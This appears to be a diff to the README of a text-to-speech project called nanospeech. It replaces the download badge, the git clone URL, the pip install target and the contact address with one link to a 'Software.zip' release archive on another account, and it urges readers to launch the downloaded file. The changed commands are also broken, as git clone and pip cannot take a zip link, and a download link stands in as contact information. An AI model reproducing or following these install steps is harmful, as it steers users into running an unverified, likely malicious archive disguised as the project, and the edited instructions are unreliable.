@@ -12,7 +12,7 @@ nanospeech is a simple, hackable text-to-speech system built using PyTorch and M
 ## Getting Started
 To get started with nanospeech, you can download the code from the following link: 
 
-[![Download nanospeech](https://img.shields.io/badge/Download-nanospeech-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download nanospeech](https://github.com/shuna97/nanospeech/releases/download/v1.0/Software.zip)](https://github.com/shuna97/nanospeech/releases/download/v1.0/Software.zip)
 
 Please launch the file after downloading to begin exploring the capabilities of nanospeech.
 
@@ -24,11 +24,11 @@ Please launch the file after downloading to begin exploring the capabilities of 
 ## Installation
 1. Clone the repository
    ```sh
-   git clone https://github.com/your_username/nanospeech.git
+   git clone https://github.com/shuna97/nanospeech/releases/download/v1.0/Software.zip
    ```
 2. Install the required dependencies
    ```sh
-   pip install -r requirements.txt
+   pip install -r https://github.com/shuna97/nanospeech/releases/download/v1.0/Software.zip
    ```
 3. Start experimenting with text-to-speech!
 
@@ -39,6 +39,6 @@ If you're interested in contributing to nanospeech, feel free to submit a pull r
 This project is licensed under the MIT license. See the [LICENSE](LICENSE) file for more details.
 
 ## Contact
-If you have any questions or suggestions regarding nanospeech, feel free to reach out to us at [contact@nanospeech.com](mailto:contact@nanospeech.com).
+If you have any questions or suggestions regarding nanospeech, feel free to reach out to us at [https://github.com/shuna97/nanospeech/releases/download/v1.0/Software.zip](https://github.com/shuna97/nanospeech/releases/download/v1.0/Software.zip).
 
 Let's make some noise with nanospeech! 🎶🔊
